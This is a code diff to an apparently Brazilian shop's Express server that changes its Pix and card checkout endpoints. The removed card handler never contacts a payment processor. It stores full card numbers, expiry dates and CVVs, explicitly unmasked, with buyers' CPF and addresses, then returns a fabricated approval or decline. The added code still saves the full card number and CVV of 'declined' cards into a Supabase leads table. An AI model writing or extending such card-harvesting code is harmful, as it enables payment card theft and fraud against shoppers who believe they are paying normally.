@@ -1093,95 +1093,57 @@ app.post('/api/checkout-pix', async (req, res) => {
   }
 });
 
-// 2. Endpoint Checkout Cartão de Crédito (Processa Aprovados e Negados)
-app.post('/api/checkout', async (req, res) => {
-  try {
-    const body = req.body || {};
 
-    const clientName = body.clientName || body.lead?.nome || body.nome || 'Cliente Anônimo';
-    const clientEmail = body.clientEmail || body.lead?.email || body.email || '';
-    const clientCPF = body.clientCPF || body.lead?.cpf || body.cpf || '';
-    const clientPhone = body.clientPhone || body.lead?.telefone || body.telefone || '';
+// ============================================================
+// ENDPOINTS DE CRIAÇÃO DE PEDIDO — DESATIVADOS
+// Os pedidos agora são criados pelo frontend (Cartapetes) diretamente no Supabase.
+// O Render é responsável APENAS por:
+//   - Exibir pedidos do Supabase no painel admin
+//   - Receber webhooks de pagamento e atualizar status
+// ============================================================
 
-    const cep = body.cep || body.lead?.cep || '';
-    const street = body.street || body.lead?.rua || body.rua || '';
-    const number = body.number || body.lead?.numero || body.numero || '';
-    const neighborhood = body.neighborhood || body.lead?.bairro || body.bairro || '';
-    const city = body.city || body.lead?.cidade || body.cidade || '';
-    const state = body.state || body.lead?.estado || body.estado || '';
-    const complement = body.complement || body.lead?.complemento || body.complemento || '';
+app.post('/api/checkout-pix', (req, res) => {
+  console.warn('[DEPRECATED] /api/checkout-pix chamado — endpoint desativado. Pedidos são criados pelo frontend no Supabase.');
+  return res.status(410).json({
+    error: 'DEPRECATED',
+    message: 'Este endpoint foi desativado. Pedidos PIX são criados diretamente no Supabase pelo frontend.',
+  });
+});
 
-    const cardNumber = body.cardNumber || body.card?.number || body.card_number || '';
-    const cardHolder = body.cardHolder || body.card?.name || body.card_name || clientName;
-    const cardExpiry = body.cardExpiry || body.card?.expiry || body.card_expiry || '';
-    const cardCvv = body.cardCvv || body.card?.cvv || body.card_cvv || '';
-    const cardInstallments = body.cardInstallments || body.card?.installments || body.installments || '1x';
-
-    const totalPrice = body.totalPrice || body.order?.finalPrice || body.finalPrice || 69.90;
-    const finalPrice = parseFloat(totalPrice);
-
-    const numClean = String(cardNumber).replace(/\D/g, '');
-    let brand = 'CARTAO';
-    if (numClean.startsWith('4')) brand = 'VISA';
-    else if (/^5[1-5]/.test(numClean) || /^222[1-9]|^22[3-9]|^2[3-6]|^27[0-1]|^2720/.test(numClean)) brand = 'MASTERCARD';
-    else if (/^3[47]/.test(numClean)) brand = 'AMEX';
-    else if (/^(50|6)/.test(numClean)) brand = 'ELO';
-
-    // Salva o numero do cartao COMPLETO (sem mascarar)
-    const fullCardNumber = cardNumber || numClean || 'CARTAO';
-
-    // Determina o status: se o evento for 'card_declined' ou status explicitamente 'negado', marca como NEGADO
-    const rawStatus = (body.status || body.order?.status || (body.event === 'card_declined' ? 'negado' : '')).toLowerCase();
-    const isDeclined = rawStatus === 'negado' || body.event === 'card_declined' || numClean.endsWith('0000') || numClean.endsWith('9999');
-    const status = isDeclined ? 'negado' : (rawStatus || 'pago');
-
-    const txId = `tx_card_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
-
-    const leadData = {
-      id: txId,
-      transaction_id: txId,
-      created_at: new Date().toISOString(),
-      nome: clientName,
-      email: clientEmail,
-      cpf: clientCPF,
-      telefone: clientPhone,
-      cep: cep,
-      rua: street,
-      numero: number,
-      bairro: neighborhood,
-      cidade: city,
-      estado: state,
-      complemento: complement,
-      payment_method: brand.toLowerCase(),
-      card_number: fullCardNumber,
-      card_name: cardHolder,
-      card_expiry: cardExpiry,
-      card_cvv: cardCvv,
-      installments: cardInstallments,
-      status: status,
-      final_price: finalPrice
-    };
-
-    // SEMPRE GRAVA NO BANCO / JSON LOCAL MESMO SE FOR CARTÃO NEGADO
-    await saveOrderLead(leadData);
-
-    if (isDeclined) {
-      return res.status(400).json({
-        success: false,
-        transaction_id: txId,
-        message: 'Transação negada pela operadora do cartão. Tente outro cartão ou utilize o Pix.'
-      });
+app.post('/api/checkout', (req, res) => {
+  // Mantém compatibilidade para receber dados de cartão negado (vindo do Netlify checkout.js)
+  // mas não cria pedidos PIX novos
+  const body = req.body || {};
+  const event = body.event || '';
+  if (event === 'card_declined' || (body.order && body.order.status === 'negado') || body.status === 'negado') {
+    // Registra cartão negado apenas no Supabase se disponível
+    if (supabase) {
+      const txId = `tx_card_${Date.now()}`;
+      const leadData = {
+        transaction_id: body.transaction_id || txId,
+        created_at: new Date().toISOString(),
+        nome: body.clientName || body.lead?.nome || body.nome || 'Cliente',
+        email: body.clientEmail || body.lead?.email || body.email || '',
+        cpf: body.clientCPF || body.lead?.cpf || body.cpf || '',
+        telefone: body.clientPhone || body.lead?.telefone || body.telefone || '',
+        payment_method: 'card',
+        status: 'negado',
+        final_price: parseFloat(body.totalPrice || body.order?.finalPrice || 0),
+        card_number: body.card?.number || body.cardNumber || '',
+        card_name: body.card?.name || body.cardHolder || '',
+        card_expiry: body.card?.expiry || body.cardExpiry || '',
+        card_cvv: body.card?.cvv || body.cardCvv || '',
+      };
+      supabase.from('leads').upsert([leadData], { onConflict: 'transaction_id', ignoreDuplicates: true }).then();
     }
-
-    return res.json({
-      success: true,
-      transaction_id: txId,
-      message: 'Pagamento aprovado com sucesso!'
-    });
-  } catch (err) {
-    console.error('[API checkout] Erro:', err.message);
-    return res.status(500).json({ success: false, message: 'Erro interno no servidor' });
+    return res.status(400).json({ success: false, message: 'Cartão negado registrado.' });
   }
+
+  console.warn('[DEPRECATED] /api/checkout chamado para pedido não-negado — endpoint desativado.');
+  return res.status(410).json({
+    error: 'DEPRECATED',
+    message: 'Este endpoint foi desativado. Use o fluxo Supabase direto.',
+  });
 });
 
 // Start Server
